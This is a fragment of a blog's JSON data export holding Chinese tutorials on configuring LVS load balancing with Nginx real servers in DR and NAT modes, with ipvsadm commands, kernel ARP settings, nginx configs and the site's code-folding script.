class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\">ip addr add 10.8.7.10/32 dev lo:1</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;VIP 已经成功添加到loopback口。&quot;</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>修改Web1内核控制系统arp响应</p>\n<p>因为要修改4个文件，设置的值也比较简单。只有在使用LVS+Nginx配置DR模式的时候才会将这4个文件设置为该值，平常使用要使用默认值。为了切换方便一点，建议使用脚本的方式。</p>\n</li>\n</ul>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ <span class=\"variable\">$#</span> -ne 1 ]</span><br><span class=\"line\"><span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&#x27;error!&#x27;</span><span class=\"string\">&quot;usage:<span class=\"variable\">$0</span> on|off&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"variable\">$1</span> <span class=\"keyword\">in</span></span><br><span class=\"line\">    on)</span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;1&quot;</span> &gt; /proc/sys/net/ipv4/conf/lo/arp_ignore</span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;2&quot;</span> &gt; /proc/sys/net/ipv4/conf/lo/arp_announce</span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;1&quot;</span> &gt; /proc/sys/net/ipv4/conf/all/arp_ignore</span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;2&quot;</span> &gt; /proc/sys/net/ipv4/conf/all/arp_announce</span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;LVS DR 模式已开启！&quot;</span></span><br><span class=\"line\">        ;;</span><br><span class=\"line\">    off)</span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;0&quot;</span> &gt; /proc/sys/net/ipv4/conf/lo/arp_ignore</span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;0&quot;</span> &gt; /proc/sys/net/ipv4/conf/lo/arp_announce</span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;0&quot;</span> &gt; /proc/sys/net/ipv4/conf/all/arp_ignore</span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;0&quot;</span> &gt; /proc/sys/net/ipv4/conf/all/arp_announce</span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;LVS DR 模式已关闭！&quot;</span></span><br><span class=\"line\">        ;;</span><br><span class=\"line\">    *)</span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">&#x27;error!&#x27;</span><span class=\"string\">&quot;usage:<span class=\"variable\">$0</span> on|off&quot;</span></span><br><span class=\"line\">        <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\"><span class=\"keyword\">esac</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>执行脚本</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">chmod</span> +x lvs_dr.sh</span><br><span class=\"line\">./lvs_dr.sh on</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h3><ol>\n<li>在Web1、Web2启动Nginx。</li>\n<li>分别执行<code>curl 172.21.8.20</code>，<code>curl 172.21.8.30</code>。验证无误后，在客户端（第4台机器）上测试<code>curl 172.21.8.80</code>，使用<strong>DR</strong>机器是不好使的。</li>\n</ol>\n<blockquote>\n<p>版权声明：以上的shell脚本知识产权由私人所有，禁止商用。</p>\n</blockquote>"},{"title":"使用LVS+Nginx配置NAT模式的Web集群","date":"2023-05-17T11:59:09.000Z","_content":"\n### 准备条件\n\n需要最少准备三台虚拟机，关闭selinx和防火墙。\n\n|主机名|身份|网络接口|连接模式|IP地址|网关|软件|\n|:---:|:---:|:---:|:---:|:---:|:---:|:---:|\n|DS|调度服务器|ens160|nat|192.168.20.40/24|192.168.20.254|ipvsadm|\n|DS|调度服务器|ens224|仅主机|172.21.8.10/24|-|ipvsadm|\n|web1|真实服务器|ens224|仅主机|172.21.8.20/24|172.21.8.10/24|nginx|\n|web2|真实服务器|ens224|仅主机|172.21.8.30/24|172.21.8.10/24|nginx|\n\nPS:\n\n1. DS一定是两块网卡，并且用一张网卡去作为真实服务器的网关。\n2. DS的两块网卡最好模式是不一样的。\n\n<!-- more -->\n\n### DS的配置\n\n下载ipvsadm\n\n```bash\nyum install -y ipvsadm\n```\n\n添加一个虚拟服务指定运输层协议为TCP、VIP为192.168.20.40、端口为80、调度算法为加权轮训。\n\n```bash\nipvsadm -A -t 192.168.20.40:80 -s rr\n```\n\n为虚拟服务器添加后端真实服务器\n\n```bash\nipvsadm -a -t 192.168.20.40:80 -r 172.21.8.20:80 -m\n```\n\n```bash\nipvsadm -a -t 192.168.20.40:80 -r 172.21.8.20:80 -m\n```\n\n使用命令查看生成的策略\n\n```bash\nipvsadm -Ln\n```\n\n开启路由转发功能\n\n```bash\necho \"1\" > /proc/sys/net/ipv4/ip_forward\n```\n\n使用命令修改轮训的时间\n\n```bash\nipvsadm --set 1 1 1\n```\n\n使用命令查看超时时间设置\n\n```bash\nipvsadm -L --timeout\n```\n\n### WEB1配置\n\n下载Nginx\n\n```bash\nyum install -y nginx\n```\n\nnginx的配置文件保存在```/etc/nginx/nginx.conf```\n\n使用命令去掉Nginx配置文件的空行和注释行\n\n```bash\negrep -v \"^[[:space:]]*#|^$\" nginx.conf.default > nginx.conf\n```\n\n修改配置文件\n\n```bash 折叠代码\nworker_processes  1;\nevents {\n    worker_connections  1024;\n}\nhttp {\n    include       mime.types;\n    default_type  application/octet-stream;\n    sendfile        on;\n    keepalive_timeout  65;\n    server {\n        listen       80;\n        server_name  172.21.8.20;    # 本机IP\n        location / {\n            root   /web;    # 根目录地址\n            index  index.html index.htm;    # 要去寻找的文件\n        }\n        error_page   500 502 503 504  /50x.html;\n        location = /50x.html {\n            root   html;\n        }\n    }\n}\n```\n\n创建HTML资源文件\n\n```bash\nmkdir /web\n```\n\n编辑网页入口文件\n\n```bash\ntouch /web/index.html\necho \"web1111\" > /web/index.html\n```\n\n开启Nginx服务\n\n```bash\nnginx\n```\n\n验证服务开启\n\n```bash\nlsof -i:80\n```\n\n### WEB2配置\n\nweb2配置基本同web1。\n\n使用命令去掉Nginx配置文件的空行和注释行\n\n```bash\negrep -v \"^[[:space:]]*#|^$\" nginx.conf.default > nginx.conf\n```\n\n修改配置文件\n\n```bash 折叠代码\nworker_processes  1;\nevents {\n    worker_connections  1024;\n}\nhttp {\n    include       mime.types;\n    default_type  application/octet-stream;\n    sendfile        on;\n    keepalive_timeout  65;\n    server {\n        listen       80;\n        server_name  172.21.8.30;\n        location / {\n            root   /web;\n            index  index.html index.htm;\n        }\n        error_page   500 502 503 504  /50x.html;\n        location = /50x.html {\n            root   html;\n        }\n    }\n}\n```\n\n创建HTML资源文件\n\n```bash\nmkdir /web\n```\n\n编辑网页入口文件\n\n```bash\ntouch /web/index.html\necho \"web2222\" > /web/index.html\n```\n\n开启Nginx服务\n\n```bash\nnginx\n```\n\n验证服务开启\n\n```bash\nlsof -i:80\n```\n\n### 测试\n\n先在web1主机\n\n```bash\ncurl 172.21.8.20\n```\n\n然后在web2主机\n\n```bash\ncurl 172.21.8.30\n```\n\n最后在DS主机上\n\n```bash\ncurl 192.168.20.40\n```\n\n如果观察到```web1111```和```web2222```来回显示在页面上则配置成功。\n\n### 其他可能用到的命令\n\nLinux查看路由表\n\n```bash\nip r s\n```\n\n重启Nginx的命令\n\n```bash\nnginx -s reload\n```\n\n关闭Nginx的命令\n\n```bash\nnginx -s stop\n```","source":"_posts/LVS-Nginx-NAT.md","raw":"---\ntitle: 使用LVS+Nginx配置NAT模式的Web集群\ndate: 2023-05-17 19:59:09\ncategories: 技术\ntags:\n  - Linux\n---\n\n### 准备条件\n\n需要最少准备三台虚拟机，关闭selinx和防火墙。\n\n|主机名|身份|网络接口|连接模式|IP地址|网关|软件|\n|:---:|:---:|:---:|:---:|:---:|:---:|:---:|\n|DS|调度服务器|ens160|nat|192.168.20.40/24|192.168.20.254|ipvsadm|\n|DS|调度服务器|ens224|仅主机|172.21.8.10/24|-|ipvsadm|\n|web1|真实服务器|ens224|仅主机|172.21.8.20/24|172.21.8.10/24|nginx|\n|web2|真实服务器|ens224|仅主机|172.21.8.30/24|172.21.8.10/24|nginx|\n\nPS:\n\n1. DS一定是两块网卡，并且用一张网卡去作为真实服务器的网关。\n2. DS的两块网卡最好模式是不一样的。\n\n<!-- more -->\n\n### DS的配置\n\n下载ipvsadm\n\n```bash\nyum install -y ipvsadm\n```\n\n添加一个虚拟服务指定运输层协议为TCP、VIP为192.168.20.40、端口为80、调度算法为加权轮训。\n\n```bash\nipvsadm -A -t 192.168.20.40:80 -s rr\n```\n\n为虚拟服务器添加后端真实服务器\n\n```bash\nipvsadm -a -t 192.168.20.40:80 -r 172.21.8.20:80 -m\n```\n\n```bash\nipvsadm -a -t 192.168.20.40:80 -r 172.21.8.20:80 -m\n```\n\n使用命令查看生成的策略\n\n```bash\nipvsadm -Ln\n```\n\n开启路由转发功能\n\n```bash\necho \"1\" > /proc/sys/net/ipv4/ip_forward\n```\n\n使用命令修改轮训的时间\n\n```bash\nipvsadm --set 1 1 1\n```\n\n使用命令查看超时时间设置\n\n```bash\nipvsadm -L --timeout\n```\n\n### WEB1配置\n\n下载Nginx\n\n```bash\nyum install -y nginx\n```\n\nnginx的配置文件保存在```/etc/nginx/nginx.conf```\n\n使用命令去掉Nginx配置文件的空行和注释行\n\n```bash\negrep -v \"^[[:space:]]*#|^$\" nginx.conf.default > nginx.conf\n```\n\n修改配置文件\n\n```bash 折叠代码\nworker_processes  1;\nevents {\n    worker_connections  1024;\n}\nhttp {\n    include       mime.types;\n    default_type  application/octet-stream;\n    sendfile        on;\n    keepalive_timeout  65;\n    server {\n        listen       80;\n        server_name  172.21.8.20;    # 本机IP\n        location / {\n            root   /web;    # 根目录地址\n            index  index.html index.htm;    # 要去寻找的文件\n        }\n        error_page   500 502 503 504  /50x.html;\n        location = /50x.html {\n            root   html;\n        }\n    }\n}\n```\n\n创建HTML资源文件\n\n```bash\nmkdir /web\n```\n\n编辑网页入口文件\n\n```bash\ntouch /web/index.html\necho \"web1111\" > /web/index.html\n```\n\n开启Nginx服务\n\n```bash\nnginx\n```\n\n验证服务开启\n\n```bash\nlsof -i:80\n```\n\n### WEB2配置\n\nweb2配置基本同web1。\n\n使用命令去掉Nginx配置文件的空行和注释行\n\n```bash\negrep -v \"^[[:space:]]*#|^$\" nginx.conf.default > nginx.conf\n```\n\n修改配置文件\n\n```bash 折叠代码\nworker_processes  1;\nevents {\n    worker_connections  1024;\n}\nhttp {\n    include       mime.types;\n    default_type  application/octet-stream;\n    sendfile        on;\n    keepalive_timeout  65;\n    server {\n        listen       80;\n        server_name  172.21.8.30;\n        location / {\n            root   /web;\n            index  index.html index.htm;\n        }\n        error_page   500 502 503 504  /50x.html;\n        location = /50x.html {\n            root   html;\n        }\n    }\n}\n```\n\n创建HTML资源文件\n\n```bash\nmkdir /web\n```\n\n编辑网页入口文件\n\n```bash\ntouch /web/index.html\necho \"web2222\" > /web/index.html\n```\n\n开启Nginx服务\n\n```bash\nnginx\n```\n\n验证服务开启\n\n```bash\nlsof -i:80\n```\n\n### 测试\n\n先在web1主机\n\n```bash\ncurl 172.21.8.20\n```\n\n然后在web2主机\n\n```bash\ncurl 172.21.8.30\n```\n\n最后在DS主机上\n\n```bash\ncurl 192.168.20.40\n```\n\n如果观察到```web1111```和```web2222```来回显示在页面上则配置成功。\n\n### 其他可能用到的命令\n\nLinux查看路由表\n\n```bash\nip r s\n```\n\n重启Nginx的命令\n\n```bash\nnginx -s reload\n```\n\n关闭Nginx的命令\n\n```bash\nnginx -s stop\n```","slug":"LVS-Nginx-NAT","published":1,"updated":"2024-05-03T03:55:54.729Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5e9002w7zj3ham2cxyt","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"准备条件\"><a href=\"#准备条件\" class=\"headerlink\" title=\"准备条件\"></a>准备条件</h3><p>需要最少准备三台虚拟机，关闭selinx和防火墙。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">主机名</th>\n<th align=\"center\">身份</th>\n<th align=\"center\">网络接口</th>\n<th align=\"center\">连接模式</th>\n<th align=\"center\">IP地址</th>\n<th align=\"center\">网关</th>\n<th align=\"center\">软件</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">DS</td>\n<td align=\"center\">调度服务器</td>\n<td align=\"center\">ens160</td>\n<td align=\"center\">nat</td>\n<td align=\"center\">192.168.20.40&#x2F;24</td>\n<td align=\"center\">192.168.20.254</td>\n<td align=\"center\">ipvsadm</td>\n</tr>\n<tr>\n<td align=\"center\">DS</td>\n<td align=\"center\">调度服务器</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">仅主机</td>\n<td align=\"center\">172.21.8.10&#x2F;24</td>\n<td align=\"center\">-</td>\n<td align=\"center\">ipvsadm</td>\n</tr>\n<tr>\n<td align=\"center\">web1</td>\n<td align=\"center\">真实服务器</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">仅主机</td>\n<td align=\"center\">172.21.8.20&#x2F;24</td>\n<td align=\"center\">172.21.8.10&#x2F;24</td>\n<td align=\"center\">nginx</td>\n</tr>\n<tr>\n<td align=\"center\">web2</td>\n<td align=\"center\">真实服务器</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">仅主机</td>\n<td align=\"center\">172.21.8.30&#x2F;24</td>\n<td align=\"center\">172.21.8.10&#x2F;24</td>\n<td align=\"center\">nginx</td>\n</tr>\n</tbody></table>\n<p>PS:</p>\n<ol>\n<li>DS一定是两块网卡，并且用一张网卡去作为真实服务器的网关。</li>\n<li>DS的两块网卡最好模式是不一样的。</li>\n</ol>\n<span id=\"more\"></span>\n\n<h3 id=\"DS的配置\"><a href=\"#DS的配置\" class=\"headerlink\" title=\"DS的配置\"></a>DS的配置</h3><p>下载ipvsadm</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y ipvsadm</span><br></pre></td></tr></table></figure>\n\n<p>添加一个虚拟服务指定运输层协议为TCP、VIP为192.168.20.40、端口为80、调度算法为加权轮训。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ipvsadm -A -t 192.168.20.40:80 -s rr</span><br></pre></td></tr></table></figure>\n\n<p>为虚拟服务器添加后端真实服务器</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ipvsadm -a -t 192.168.20.40:80 -r 172.21.8.20:80 -m</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ipvsadm -a -t 192.168.20.40:80 -r 172.21.8.20:80 -m</span><br></pre></td></tr></table></figure>\n\n<p>使用命令查看生成的策略</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ipvsadm -Ln</span><br></pre></td></tr></table></figure>\n\n<p>开启路由转发功能</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;1&quot;</span> &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>\n\n<p>使用命令修改轮训的时间</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ipvsadm --<span class=\"built_in\">set</span> 1 1 1</span><br></pre></td></tr></table></figure>\n\n<p>使用命令查看超时时间设置</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ipvsadm -L --<span class=\"built_in\">timeout</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"WEB1配置\"><a href=\"#WEB1配置\" class=\"headerlink\" title=\"WEB1配置\"></a>WEB1配置</h3><p>下载Nginx</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y nginx</span><br></pre></td></tr></table></figure>\n\n<p>nginx的配置文件保存在<code>/etc/nginx/nginx.conf</code></p>\n<p>使用命令去掉Nginx配置文件的空行和注释行</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">egrep -v <span class=\"string\">&quot;^[[:space:]]*#|^$&quot;</span> nginx.conf.default &gt; nginx.conf</span><br></pre></td></tr></table></figure>\n\n<p>修改配置文件</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">worker_processes  1;</span><br><span class=\"line\">events &#123;</span><br><span class=\"line\">    worker_connections  1024;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">http &#123;</span><br><span class=\"line\">    include       mime.types;</span><br><span class=\"line\">    default_type  application/octet-stream;</span><br><span class=\"line\">    sendfile        on;</span><br><span class=\"line\">    keepalive_timeout  65;</span><br><span class=\"line\">    server &#123;</span><br><span class=\"line\">        listen       80;</span><br><span class=\"line\">        server_name  172.21.8.20;    <span class=\"comment\"># 本机IP</span></span><br><span class=\"line\">        location / &#123;</span><br><span class=\"line\">            root   /web;    <span class=\"comment\"># 根目录地址</span></span><br><span class=\"line\">            index  index.html index.htm;    <span class=\"comment\"># 要去寻找的文件</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        error_page   500 502 503 504  /50x.html;</span><br><span class=\"line\">        location = /50x.html &#123;</span><br><span class=\"line\">            root   html;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>创建HTML资源文件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mkdir</span> /web</span><br></pre></td></tr></table></figure>\n\n<p>编辑网页入口文件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">touch</span> /web/index.html</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;web1111&quot;</span> &gt; /web/index.html</span><br></pre></td></tr></table></figure>\n\n<p>开启Nginx服务</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nginx</span><br></pre></td></tr></table></figure>\n\n<p>验证服务开启</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lsof -i:80</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"WEB2配置\"><a href=\"#WEB2配置\" class=\"headerlink\" title=\"WEB2配置\"></a>WEB2配置</h3><p>web2配置基本同web1。</p>\n<p>使用命令去掉Nginx配置文件的空行和注释行</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">egrep -v <span class=\"string\">&quot;^[[:space:]]*#|^$&quot;</span> nginx.conf.default &gt; nginx.conf</span><br></pre></td></tr></table></figure>\n\n<p>修改配置文件</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">worker_processes  1;</span><br><span class=\"line\">events &#123;</span><br><span class=\"line\">    worker_connections  1024;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">http &#123;</span><br><span class=\"line\">    include       mime.types;</span><br><span class=\"line\">    default_type  application/octet-stream;</span><br><span class=\"line\">    sendfile        on;</span><br><span class=\"line\">    keepalive_timeout  65;</span><br><span class=\"line\">    server &#123;</span><br><span class=\"line\">        listen       80;</span><br><span class=\"line\">        server_name  172.21.8.30;</span><br><span class=\"line\">        location / &#123;</span><br><span class=\"line\">            root   /web;</span><br><span class=\"line\">            index  index.html index.htm;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        error_page   500 502 503 504  /50x.html;</span><br><span class=\"line\">        location = /50x.html &#123;</span><br><span class=\"line\">            root   html;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>创建HTML资源文件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mkdir</span> /web</span><br></pre></td></tr></table></figure>\n\n<p>编辑网页入口文件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">touch</span> /web/index.html</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;web2222&quot;</span> &gt; /web/index.html</span><br></pre></td></tr></table></figure>\n\n<p>开启Nginx服务</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nginx</span><br></pre></td></tr></table></figure>\n\n<p>验证服务开启</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lsof -i:80</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h3><p>先在web1主机</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl 172.21.8.20</span><br></pre></td></tr></table></figure>\n\n<p>然后在web2主机</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl 172.21.8.30</span><br></pre></td></tr></table></figure>\n\n<p>最后在DS主机上</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl 192.168.20.40</span><br></pre></td></tr></table></figure>\n\n<p>如果观察到<code>web1111</code>和<code>web2222</code>来回显示在页面上则配置成功。</p>\n<h3 id=\"其他可能用到的命令\"><a href=\"#其他可能用到的命令\" class=\"headerlink\" title=\"其他可能用到的命令\"></a>其他可能用到的命令</h3><p>Linux查看路由表</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip r s</span><br></pre></td></tr></table></figure>\n\n<p>重启Nginx的命令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nginx -s reload</span><br></pre></td></tr></table></figure>\n\n<p>关闭Nginx的命令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nginx -s stop</span><br></pre></td></tr></table></figure>","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      